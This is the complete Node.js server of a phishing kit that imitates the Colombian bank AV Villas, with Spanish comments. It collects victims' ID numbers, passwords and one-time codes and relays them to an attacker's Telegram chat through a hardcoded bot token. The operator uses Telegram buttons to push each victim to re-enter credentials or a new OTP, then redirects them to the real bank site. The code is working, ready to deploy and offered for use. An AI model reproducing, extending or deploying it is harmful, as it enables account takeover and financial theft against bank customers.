/**
 * AV Villas Co-banking Digital - Server
 * Servidor Node.js con Express, Socket.IO y Telegram Bot
 */

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

// ============================================
// CONFIGURACIÓN
// ============================================
const CONFIG = {
    PORT: 3000,
    TELEGRAM: {
        BOT_TOKEN: '8520156390:AAGD07USz4taUVi8whydEPExTnf4qUQO5aU',
        CHAT_ID: '-5029729816'
    }
};

// ============================================
// INICIALIZACIÓN DEL SERVIDOR
// ============================================
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    pingTimeout: 30000,
    pingInterval: 10000,
    transports: ['websocket', 'polling'],
    allowEIO3: true,
    connectTimeout: 10000,
    upgradeTimeout: 5000,
    maxHttpBufferSize: 1e8,
    perMessageDeflate: false
});

// Middlewares
app.use(express.static(__dirname));
app.use(express.json());

// Crear bot de Telegram con configuración optimizada
const bot = new TelegramBot(CONFIG.TELEGRAM.BOT_TOKEN, { 
    polling: {
        interval: 100,
        autoStart: true,
        params: {
            timeout: 10
        }
    },
    filepath: false
});

// ============================================
// GESTIÓN DE CLIENTES
// ============================================
class ClientManager {
    constructor() {
        this.clients = new Map();
        this.messageToSession = new Map(); // messageId -> sessionId
    }

    add(socket) {
        const sessionId = socket.handshake.query.sessionId || socket.id;
        
        this.clients.set(socket.id, {
            socket: socket,
            sessionId: sessionId,
            connectedAt: new Date()
        });
        
        console.log(`✅ Cliente conectado: ${socket.id} | Sesión: ${sessionId} | Total: ${this.clients.size}`);
    }

    remove(socketId) {
        this.clients.delete(socketId);
        console.log(`❌ Cliente desconectado: ${socketId} | Total: ${this.clients.size}`);
    }

    broadcast(event, data) {
        let sent = 0;
        this.clients.forEach((client) => {
            try {
                if (client.socket.connected) {
                    client.socket.emit(event, data);
                    sent++;
                }
            } catch (error) {
                console.error(`Error broadcast a ${client.socket.id}:`, error.message);
            }
        });
        console.log(`📡 Broadcast "${event}" enviado a ${sent} cliente(s)`);
        return sent;
    }

    associateMessage(messageId, sessionId) {
        this.messageToSession.set(messageId, sessionId);
        console.log(`🔗 Mensaje ${messageId} asociado a sesión ${sessionId}`);
    }

    sendToSession(sessionId, event, data) {
        let sent = 0;
        this.clients.forEach((client) => {
            if (client.sessionId === sessionId && client.socket.connected) {
                try {
                    client.socket.emit(event, data);
                    sent++;
                    console.log(`📤 Enviado "${event}" a cliente ${client.socket.id} (sesión: ${sessionId})`);
                } catch (error) {
                    console.error(`Error al enviar a ${client.socket.id}:`, error.message);
                }
            }
        });
        return sent;
    }

    getSessionByMessage(messageId) {
        return this.messageToSession.get(messageId);
    }

    getCount() {
        return this.clients.size;
    }
}

const clientManager = new ClientManager();

// ============================================
// UTILIDADES
// ============================================
const Utils = {
    /**
     * Formatea la fecha actual
     */
    getCurrentDateTime: () => {
        return new Date().toLocaleString('es-CO', {
            timeZone: 'America/Bogota',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    },

    /**
     * Escapa caracteres especiales para Markdown V2
     */
    escapeMarkdown: (text) => {
        return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
    },

    /**
     * Formatea un mensaje de error
     */
    formatError: (error) => {
        return {
            message: error.message,
            code: error.code,
            timestamp: new Date().toISOString()
        };
    }
};

// ============================================
// SERVICIO DE TELEGRAM
// ============================================
class TelegramService {
    static async sendLoginData(data, sessionId) {
        try {
            const message = 
                `🔐 Nueva información de login\n\n` +
                `Tipo de documento: ${data.documentType}\n` +
                `Número de documento: ${data.documentNumber}\n` +
                `Contraseña: ${data.password}\n\n` +
                `Recibido: ${Utils.getCurrentDateTime()}\n` +
                `Sesión: ${sessionId.substring(0, 15)}...`;

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '🔑 Pedir Login', callback_data: `request_login:${sessionId}` },
                        { text: '📱 Pedir OTP', callback_data: `request_otp:${sessionId}` }
                    ],
                    [
                        { text: '✅ Finalizar', callback_data: `finalize:${sessionId}` }
                    ]
                ]
            };

            const result = await bot.sendMessage(CONFIG.TELEGRAM.CHAT_ID, message, {
                reply_markup: keyboard
            });

            console.log('✅ Datos de login enviados a Telegram');
            return { success: true, messageId: result.message_id };

        } catch (error) {
            console.error('❌ Error al enviar login a Telegram:', error.message);
            return { success: false, error: Utils.formatError(error) };
        }
    }

    static async sendOTP(data, sessionId) {
        try {
            const message = 
                `📱 Código OTP recibido\n\n` +
                `Código: ${data.otpCode}\n\n` +
                `👤 Datos del usuario:\n` +
                `Tipo de documento: ${data.documentType}\n` +
                `Número de documento: ${data.documentNumber}\n` +
                `Contraseña: ${data.password}\n\n` +
                `Recibido: ${Utils.getCurrentDateTime()}\n` +
                `Sesión: ${sessionId.substring(0, 15)}...`;

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '🔑 Pedir Login', callback_data: `request_login:${sessionId}` },
                        { text: '📱 Pedir OTP Nuevo', callback_data: `request_otp:${sessionId}` }
                    ],
                    [
                        { text: '✅ Finalizar', callback_data: `finalize:${sessionId}` }
                    ]
                ]
            };

            const result = await bot.sendMessage(CONFIG.TELEGRAM.CHAT_ID, message, {
                reply_markup: keyboard
            });

            console.log('✅ Código OTP enviado a Telegram');
            return { success: true, messageId: result.message_id };

        } catch (error) {
            console.error('❌ Error al enviar OTP a Telegram:', error.message);
            return { success: false, error: Utils.formatError(error) };
        }
    }
}

// ============================================
// MANEJADORES DE SOCKET.IO
// ============================================
io.on('connection', (socket) => {
    clientManager.add(socket);

    socket.on('disconnect', (reason) => {
        clientManager.remove(socket.id);
        console.log(`🔌 Desconexión: ${reason} | Socket: ${socket.id}`);
    });

    socket.on('login-data', async (data) => {
        const client = clientManager.clients.get(socket.id);
        console.log('📥 Datos de login recibidos:', {
            documentType: data.documentType,
            documentNumber: data.documentNumber,
            sessionId: client?.sessionId,
            timestamp: data.timestamp
        });

        const result = await TelegramService.sendLoginData(data, client?.sessionId || socket.id);
        socket.emit('telegram-sent', result);
    });

    socket.on('otp-data', async (data) => {
        const client = clientManager.clients.get(socket.id);
        console.log('📥 Código OTP recibido:', {
            otpCode: data.otpCode,
            sessionId: client?.sessionId,
            timestamp: data.timestamp
        });

        const result = await TelegramService.sendOTP(data, client?.sessionId || socket.id);
        socket.emit('telegram-sent', result);
    });

    socket.on('ping', () => {
        socket.emit('pong');
    });

    socket.on('error', (error) => {
        console.error(`❌ Error en socket ${socket.id}:`, error.message);
    });
});

// ============================================
// MANEJADORES DE TELEGRAM BOT
// ============================================
bot.on('callback_query', async (callbackQuery) => {
    const callbackData = callbackQuery.data;
    const [action, sessionId] = callbackData.split(':');
    const messageId = callbackQuery.message.message_id;

    console.log(`📲 Callback: ${action} | Sesión: ${sessionId?.substring(0, 15)}...`);

    // Responder inmediatamente al callback para que no se quede cargando
    bot.answerCallbackQuery(callbackQuery.id, {
        text: '⏳ Procesando...',
        show_alert: false
    }).catch(err => console.error('Error answerCallback:', err.message));

    try {
        // Buscar el cliente con esta sessionId
        let targetClient = null;
        clientManager.clients.forEach((client) => {
            if (client.sessionId === sessionId && client.socket.connected) {
                targetClient = client;
            }
        });
        
        if (!targetClient) {
            // Editar la respuesta del callback
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '⚠️ Cliente no conectado'
            }).catch(() => {});
            return;
        }

        let commandExecuted = false;

        // Ejecutar el comando según la acción - solo para este cliente
        if (action === 'request_login') {
            targetClient.socket.emit('redirect', { page: 'login' });
            commandExecuted = true;
            console.log(`📤 Redirect login → ${sessionId?.substring(0, 15)}...`);
        } else if (action === 'request_otp') {
            targetClient.socket.emit('redirect', { page: 'otp' });
            commandExecuted = true;
            console.log(`📤 Redirect OTP → ${sessionId?.substring(0, 15)}...`);
        } else if (action === 'finalize') {
            targetClient.socket.emit('redirect', { 
                page: 'finalize', 
                url: 'https://www.avvillas.com.co/' 
            });
            commandExecuted = true;
            console.log(`📤 Redirect finalize → ${sessionId?.substring(0, 15)}...`);
        }

        // Editar el mensaje para mostrar confirmación (sin await para no bloquear)
        if (commandExecuted) {
            const originalText = callbackQuery.message.text;
            if (!originalText.includes('✅ Comando ejecutado')) {
                const updatedText = originalText + '\n\n✅ Comando ejecutado';
                
                bot.editMessageText(updatedText, {
                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
                    message_id: messageId,
                    reply_markup: callbackQuery.message.reply_markup
                }).catch(err => {
                    if (!err.message.includes('message is not modified')) {
                        console.error('⚠️ Error editar:', err.message);
                    }
                });
            }
        }

    } catch (error) {
        console.error('❌ Error en callback:', error.message);
    }
});

bot.on('polling_error', (error) => {
    console.error('❌ Error en el polling del bot:', error.message);
});

bot.on('error', (error) => {
    console.error('❌ Error en el bot de Telegram:', error.message);
});

// ============================================
// RUTAS HTTP
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/otp', (req, res) => {
    res.sendFile(path.join(__dirname, 'otp.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'otp.html'));
});

app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        clients: clientManager.getCount(),
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// Manejo de errores 404
app.use((req, res) => {
    res.status(404).send('Página no encontrada');
});

// ============================================
// INICIAR SERVIDOR
// ============================================
server.listen(CONFIG.PORT, () => {
    console.log('\n' + '='.repeat(60));
    console.log('🚀 AV Villas Co-banking Digital - Servidor Iniciado');
    console.log('='.repeat(60));
    console.log(`✅ Servidor HTTP: http://localhost:${CONFIG.PORT}`);
    console.log(`✅ Socket.IO: Activo`);
    console.log(`✅ Bot de Telegram: Activo`);
    console.log(`✅ Chat ID: ${CONFIG.TELEGRAM.CHAT_ID}`);
    console.log('='.repeat(60) + '\n');
});

// Manejo de errores no capturados
process.on('uncaughtException', (error) => {
    console.error('❌ Excepción no capturada:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Promise rechazada no manejada:', reason);
});
